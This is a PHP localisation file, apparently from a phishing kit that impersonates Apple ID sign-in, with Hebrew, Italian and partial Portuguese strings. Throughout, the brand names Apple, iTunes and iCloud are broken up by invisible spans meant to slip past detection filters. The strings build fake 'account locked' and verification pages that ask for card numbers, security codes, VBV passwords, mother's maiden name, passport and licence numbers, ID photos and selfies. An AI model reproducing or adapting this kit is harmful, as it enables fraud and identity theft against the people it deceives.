	$ForgotApple = "שכחת מזהה או סיסמה של <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>?";
	$accounteverything = "החשבון שלך עבור כל <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$services = "מזהה יחיד של <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> וסיסמה מעניק לך גישה לכל שירותי <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$about = "למידע נוסף על זיהוי <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$CreateApple = "צור את מזהה <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> שלך";
	$Shopthe = "קנה את ";
	$OnlineStore = "חנות מקוונת של";
	$visit = " בקר ";
	$RetailStore = "חנות קמעונאית <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$find = " או למצוא ";
	$reseller = "מפיץ";
	$AppleInfo = "פרטי <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$Map = "מפת האתר";
	$News = "חדשות חמות";
	$Feeds = "RSS Feeds";
	$Contact = "תיצור איתנו קשר";
	$rightsreserved = "זכויות יוצרים © 2019 <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Inc. כל הזכויות שמורות.";
	$TermsUse = "תנאי שימוש";
	$Policy = "מדיניות פרטיות";
	
// Login page
	
	$accManageount = "נהל את מזהה <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> של חשבון <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> שלך";
	$acApplecount = "נהל את חשבון <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> שלך";
	$Password = "סיסמה";
	$Rmeemember = "זכור אותי";
	$morehelp = "צריך עוד עזרה? ";
	$Chatnow = "שוחח עכשיו";
	$M800YAPPLE = " או להתקשר 1-800-MY-<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$cfasterheckout = "היכנס לקופה מהירה יותר."; // Other sing
	$iCsaddressignloud = "מזהה <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> שלך הוא כתובת האימייל שבה אתה משתמש כדי להיכנס ל- <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>29dc13fd93be42de3a3f632dc2daf8ab</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>, ל- App Store ול- <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>.";
	$ISignn = "היכנס";
	$pForgotassword = "שכחת את זיהוי ה- <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> או את הסיסמה שלך?";
	$unpassworddefined = "שכחת את זיהוי ה- <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> או את הסיסמה שלך? לא מוגדר";
	$Creatonee = "אין לך מזהה <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? צור אחד עכשיו.";
	$haveCApplereate = "אין לך מזהה <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? צור אחד עכשיו.";
	$IApplesD = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID";
	$fAqqq = "FAQ"; // added new

// Lock	page

	$securityreasons = " מזהה <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> זה ננעל מסיבות אבטחה.";
	$beforesigning = "עליך לבטל את נעילת החשבון שלך לפני הכניסה.";
	$UnlockAccount = "ביטול נעילת חשבון";
	
// Verify page

    $yourinformation = "אשר את הפרטים שלך";
	$AccountVerification = "אימות חשבון";
	$YourAppleID = "מזהה <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> שלך הוא ";
	$OuSignt = "התנתק ";
	$PersonalInformation = "מידע אישי";
	$NAME = "שם";
	$firstname = "שם פרטי";
	$middlename = "שם אמצעי (אופציונלי)";
	$lastname = "שם משפחה";
	$OFBIRTH = "תאריך לידה";
	$dateobirth = "תאריך לידה";
	$TELEPHONE = "טלפון";
	$ADDRESS = "כתובת";
    $LineADDRESS = "כתובת ";
	$city = "עיר";
	$POSTCO = "מיקוד";
	$AccountDetails = "פרטי חשבון";
	$CARDDETAILS = "פרטי כרטיס";
	$CAname = "שם בעל הכרטיס";
	$CAnumber = "מספר כרטיס";
	$CAdater = "תאריך תפוגה";
	$securitycode = "קוד אבטחה של כרטיס";
	$cardpassword = "סיסמת vbv או סיסמת כרטיס";
	$Security = "אבטחה";
	$SELECTQUESTION = "בחר שאלת אבטחה";
	$securityquestion = "בחר שאלת אבטחה";
	$MaideNamen = "שם המשפחה לפני הנישואים של אמא";
	$LicenseNumber = "מספר רישיון נהיגה";
	$PassportNumber = "מספר דרכון";
	$answer = "תשובה";

// Id 1

	$IdentityVerification = "אימות זהות";
	$doIDcument = "1 - להעלות תמונות של שני הצדדים של תעודת הזהות שלך.";
	$residencedocument = "2 - העלה מסמך הוכחת מסמך מגורים";
	$couldyour = "זה יכול להיות שלך :";
	$billinternet = "חשבון הבנק או שטר השירות (חשבון החשמל, חשבון המים, חשבון האינטרנט וכו ')";
	$Email = " Email";
	$fsidedocument = " - הצד הקדמי של תעודת הזהות שלך";
	$Backside = " - הצד האחורי של תעודת הזהות שלך";
	$residencephoto = " - הוכחת תמונה מסמך מגורים";

// Id 2
    $sidespaymentcard = "העלה תמונות משני צידי כרטיס התשלום שלך.&nbsp;";
	$Email = " Email";
	$FrontsideCard = " - הצד הקדמי של כרטיס התשלום שלך";
	$syourideBack = " - הצד האחורי של כרטיס התשלום שלך";
	$Email = "";
	$Email = "";
	
	$clearCard = "-אנא העלה תמונה ברורה של תעודת הזהות שלך"; 
$takeselfie = "-עליך להחזיק את תעודת הזהות שלך ליד הפנים ולselfie"; 
$thenupload = "בחר את התמונה ואז לחץ על העלאה"; 
$uploadii = "העלה &rarr;"; 
	
// Fin

    $VerificationComplete = "אימות החשבון הושלם";
    $accessaccount = "המתן בזמן שאנו משחזרים את הגישה לחשבון שלך ...";
    $automaticallylogged = "עבור האבטחה שלך אתה באופן אוטומטי להיות מחובר. ";
	
// Link Email

    $vverrmail = "הוסף את כתובת הדואל שלך.";
	$emaillsz = "Email";
	$wontsy = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> לא תשמור את הסיסמה שלך.";
	$itoCloud = "היכנס ל- <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>";
    $Keepme = "השאר אותי מחובר";
break;



case "IT": 
    $TTLEZ = "Accedi";
	$SignIn = "Accedi";
	$Createapid = "Crea il tuo <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID";
	$ForgotApple = "dimenticato <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID o password?";
	$accounteverything = "il tuo account per &nbsp; tutto &nbsp; mela.";
	$services = "un singolo <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID e una password ti consentono di accedere a tutti i servizi <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$about = "Scopri di più su <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID &nbsp;"; 
    $CreateApple = "Crea il tuo <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID"; 
    $Shopthe = "Acquista il"; 
    $OnlineStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Online Store"; 
    $Visit = "visita un"; 
    $RetailStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Retail Store"; 
    $Find = "o trova un"; 
    $Reseller = "rivenditore"; 
    $AppleInfo = "informazioni <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
    $Map = "mappa del sito"; 
    $News = "notizie calde"; 
    $Feeds = "feed RSS"; 
    $Contact = "Contattaci"; 
    $rightsreserved = "Copyright © 2019 <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Inc. Tutti i diritti riservati. "; 
    $TermsUse = "condizioni d'uso"; 
    $Policy = "politica sulla privacy";
	
// Login page
	
	$accManageount = "Gestisci il tuo account <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
    $acApplecount = "Gestisci il tuo account <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
    $Password = "password"; 
    $Rmeemember = "Ricordati di me"; 
    $morehelp = "hai bisogno di più aiuto?"; 
    $Chatnow = "Chatta ora"; 
    $M800YAPPLE = "o chiama 1-800-MY-<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>."; 
    $cfasterheckout = "Accedi per un checkout più veloce.";
    $iCsaddressignloud = "il tuo ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> è l'indirizzo email che usi per accedere a <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>29dc13fd93be42de3a3f632dc2daf8ab</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>, all'App Store e a <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>."; 
    $ISignn = "Accedi"; 
    $pForgotassword = "Hai dimenticato il tuo ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> o la password?"; 
    $unpassworddefined = "Hai dimenticato il tuo ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> o la password? non definito "; 
    $Creatonee = "non hai un ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Crearne uno ora. "; 
    $haveCApplereate = "non hai un ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Crearne uno ora. non definito "; 
    $IApplesD = "ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
    $fAqqq = "FAQ";

// Lock	page

	$securityreasons = " This <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID has been locked for security reasons.";
	$beforesigning = "You must unlock your account before signing in.";
	$UnlockAccount = "Unlock Account";
	
// Verify page

    $yourinformation = "Confirm your information";
	$AccountVerification = "Account Verification";
	$YourAppleID = "Your <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID is ";
	$OuSignt = "Sign Out ";
	$PersonalInformation = "Personal Information";
	$NAME = "Name";
	$firstname = "first name";
	$middlename = "middle name (optional)";
	$lastname = "last name";
	$OFBIRTH = "DATE OF BIRTH";
	$dateobirth = "date of birth";
	$TELEPHONE = "TELEPHONE";
	$rtphone = "telephone number"; // add it 
	$ADDRESS = "ADDRESS";
    $LineADDRESS = "address Line ";
	$city = "town / city";
	$POSTCO = "POSTAL CODE";
	$AccountDetails = "Account Details";
	$CARDDETAILS = "Card Details";
	$CAname = "cardholders name";
	$CAnumber = "card number";
	$CAdater = "expiry date";
	$securitycode = "card security code";
	$cardpassword = "vbv password or card password";
	$Security = "Security";
	$SELECTQUESTION = "Select A Security Question";
	$securityquestion = "select security question";
	$MaideNamen = "Mother&apos;s Maiden Name";
	$LicenseNumber = "Driving License Number";
	$PassportNumber = "Passport Number";
	$answer = "answer";
	$nxt = "Successivo";

// Id 1

	$IdentityVerification = "Identity Verification";
	$doIDcument = "1 - Upload photos of both sides of your ID document.";
	$residencedocument = "2 - Upload Proof of residence document photo";
	$couldyour = "This could be your :";
	$billinternet = "Bank statement or Utility bill (electricity bill, water bill, internet bill, etc.)";
	$Email = " Email";
	$fsidedocument = " - Front side of your ID document";
	$Backside = " - Back side of your ID document";
	$residencephoto = " - Proof of residence document photo";

// Id 2
    $sidespaymentcard = "Upload photos of both sides of your payment card.&nbsp;";
	$Email = " Email";
	$FrontsideCard = " - Front side of your Payment Card";
	$syourideBack = " - Back side of your Payment Card";
	$Email = "";
	$Email = "";
	
// Id 3
    $clearCard = "- Please upload a clear photo of your ID Card";
	$takeselfie = "- You should hold your ID next to your face and take a selfie";
	$thenupload = " Choose the photo then click upload. ";
	$uploadii = "Upload &rarr;";
	
// Fin

    $VerificationComplete = "Account Verification Complete";
    $accessaccount = "Please wait while we restore your account access...";
    $automaticallylogged = "For your security you will automatically be logged out. ";
	
// Link Email

    $vverrmail = "Add your email address.";
	$emaillsz = "Email";
	$wontsy = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> won't store your password.";
Break;

case "PT": 
$TTLEZ = "entrar"; 
$nxt = "Próximo";
$SignIn = "entrar"; 
$Createapid = "criar o seu <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID"; 
$ForgotApple = "esqueceu a <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID ou a senha?"; 
